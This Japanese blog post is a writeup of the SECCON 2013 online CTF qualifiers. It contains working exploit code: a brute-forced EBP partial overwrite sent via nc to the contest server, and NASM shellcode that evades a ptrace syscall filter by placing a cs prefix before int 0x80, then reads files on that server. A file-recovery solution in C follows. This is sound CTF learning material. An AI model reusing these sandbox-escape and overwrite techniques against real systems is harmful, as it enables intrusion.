---
date: '2014-01-30T11:40:33+09:00'
title: SECCON 2013 オンライン予選 writeup
categories:
 - CTF
 - writeup
tags:
 - SECCON
---

SECCON オンライン予選にチーム0x0のメンバーとして参加しました。

3700点で7位でした。

bin500に時間をかけ過ぎた結果、練習問題とbin200しか解けなかった。

バイナリ問題以外も見ておけばよかった

{{<image classes="fancybox" src="/assets/seccon-2013-online-quals-writeup/90b303d7e1e753a918811d598aa91f83.png" title="スコアの推移">}}

<!--more-->

## exploit me (bin200)

EBPの最後の1バイトを上書きできる。

0x8048e80にflagを表示する関数があるのでうまくそこにリターンさせればクリア

    import subprocess
     
    for i in range(256):
        subprocess.call(r"""python -c "import sys,struct; sys.stdout.write(struct.pack('<L', 0x8048e80) * 20
     + '\x%02x')" | nc exploitme.quals.seccon.jp 31337 -v""" % i, shell=True)

## hack this site (bin500)

プロセスのメモリダンプと長時間格闘した末、終了2時間前に任意のシステムコールを呼び出す方法に気づいたが、任意のファイルを読み込めるようになったところで時間切れになってしまった。

シェルコードをサーバーに投げると、forkした子プロセス内でptraceを使用してシングルステップ実行される。

シェルコードには以下の制限がある。

 * 最大64byte
 * int 0x80、sysenterは親プロセスでエミュレートされる。
    * stdoutへのwriteは40byteのバッファへの書き込みに置換され、実行後に出力される。
    * それ以外のシステムコールは無視される。
    * システムコール実行後には子プロセスがkillされる。
    * シェルコードが展開される1024byteのバッファの外を実行しようとするとkillされる。
    * INT3するとkillされる。

システムコールへの呼び出しを
命令の先頭が一致するかどうかでチェックしているので、int
0x80の前にプレフィックスをつけるとチェックをすり抜けて任意のシステムコールが実行できる。

あとはgetdirentsでファイルのリストを取得

    #!/usr/bin/python
    import socket
    import subprocess
    import pack
    import re
     
    def execute(asm, apd):
        fasm = open("/tmp/bin.asm", "w")
        fasm.write(asm)
        fasm.close()
        subprocess.check_call("nasm /tmp/bin.asm", shell=True)
        #s = socket.create_connection(("133.242.20.195", 80))
        s = socket.create_connection(("133.242.18.174", 80))
        bin_ = open("/tmp/bin", "r")
        shellcode = bin_.read() + apd
        if len(shellcode) > 64:
            print "beep"
            print len(shellcode)
        url = "GET /cgi-bin/99.cgi?"
        for ch in shellcode:
            url += ("%%%02x" % ord(ch))
        s.send(url + "\r\n")
        result = ""
        while True:
            a = s.recv(4096)
            result += a
            if len(a) <= 0:
                break
        s.close()
        return result
     
    shellcode_ls = """
    bits 32
    org 0
    lea ebx,[eax+A + 1] ;path
    mov eax,0x5 ;open
    mov ecx, 0x10000 ;O_DIRECTORY
    cs int 0x80
     
    mov ebx, eax
    mov eax, 141 ;getdents
    mov ecx, esp ;buf
    mov edx, 0x1000 ;buf size
    cs int 0x80
     
    lea ecx, [esp+10] ;buf
    mov edx,0x1000 ;size
    mov eax,0x4 ;write
    mov ebx,0x1 ;stdout
    int 0x80
     
    A:
    db ".", 0 ;path
    """
     
    print execute(shellcode_ls, "")

lseekとreadでpwd.zipを読み込む。

    wfile = open("pwd.zip", "w")
    readed = 0
    readsize = 0x10400
    while readed < readsize:
        print readed
        shellcode_cat = """
        bits 32
        org 0
        lea ebx,[eax + A + 1] ;eax = address of shellcode
        xor eax,eax
        mov al,0x5 ;open
        xor ecx,ecx
        cs int 0x80
     
        mov ebx, eax
        mov ecx, 0x{0:x}
        xor edx, edx ;SEEK_SET
        xor eax,eax
        mov al, 19 ;lseek
        cs int 0x80
     
        xor eax,eax
        mov al,0x3 ;read
        mov edi,esp
        mov ecx,edi
        mov edx,0x100000
        cs int 0x80
     
        shr eax, 2
        mov esi, esp
        mov ecx, eax
        rep lodsd
     
        A:
        db "pwd.zip", 0
        """.format(readed)
     
        result = execute(shellcode_cat, "")
        m = re.findall(r"""eip: f3 ad \( rep lodsd \)
     
    eax=(\w+), ecx=\w+, edx=\w+, ebx=\w+
    esi=\w+, edi=\w+, esp=\w+, ebp=\w+
    eip=\w+, eflags=\w+""", result, re.M)
        buf = ""
        for value in m:
            buf += pack.pl32(int(value, 16))
            readed += 4
        wfile.write(buf)
     
    wfile.close()

pwd.zipを解凍すると comb,xxx.bin,hint.txtが出てくる。

$ nkf hint.txt

    pwd.bmpとpwd.pngは
    フォーマットが違うだけで同じ画像

    $ ./comb pwd.bmp pwd.png > xxx.bin

    このように実行された

combは以下のような動作をするプログラム。

    char *file1_buf;
    int file1_size;
    char *file2_buf;
    int file2_size;
     
    read_whole_file(argv[1], &file1_buf, &file1_size);
    read_whole_file(argv[2], &file2_buf, &file2_size);
    srand(time(0));
     
    do {
        if (rand() % (file1_size + file2_size) >= file1_size) {
            fwrite(file2_buf, 1, 16, stdout);
            file2_buf += 16;
            file2_size -= 16;
        } else {
            fwrite(file1_buf, 1, 16, stdout);
            file1_buf += 16;
            file1_size -= 16;
        }
     
        if (file1_size < 0) file1_size = 0;
        if (file2_size < 0) file2_size = 0;
    } while(file1_size + file2_size > 0);

\

xxx.binの更新時間から乱数のseedを、BMPのヘッダからpwd.bmpのファイルサイズを、PNGのフッタとpwd.bmpのファイルサイズから
pwd.pngのファイルサイズを復元できる。 

    #include <stdio.h>
    #include <stdlib.h>
     
    void read_whole_file(const char *filename, char **bufptr, size_t *size) {
        FILE *a = fopen(filename, "rb");
        if (!a) abort();
        fseek(a, 0, SEEK_END);
        *size = ftell(a);
        *bufptr = (char *)malloc(*size);
        fseek(a, 0, SEEK_SET);
        fread(*bufptr, 1, *size, a);
        fclose(a);
    }
     
    int main() {
        char *buf;
        size_t size;
     
        read_whole_file("xxx.bin", &buf, &size);
     
        FILE *bmp = fopen("pwd.bmp", "wb");
        FILE *png = fopen("pwd.png", "wb");
        int bmp_size = 91150;   //bmp size from header
        int png_size = size - ((bmp_size + 15) & ~15) - 4;
        srand(1387271182 - 1); //mtime of xxx.bin
                               //zipのタイムスタンプの精度は2秒
        for (int i = 0; i < size; i += 16) {
            if ((rand() % (bmp_size + png_size)) >= bmp_size) {
                fwrite(buf + i, 1, 16, png);
                png_size -= 16;
            } else {
                fwrite(buf + i, 1, 16, bmp);
                bmp_size -= 16;
            }
     
            if (bmp_size < 0) bmp_size = 0;
            if (png_size < 0) png_size = 0;
        }
        fclose(bmp);
        fclose(png);
     
        return 0;
    }

$ xdg-open pwd.png

{{<image classes="fancybox" src="/assets/seccon-2013-online-quals-writeup/xxx.png" title="Password: LAstEsCaPE">}}
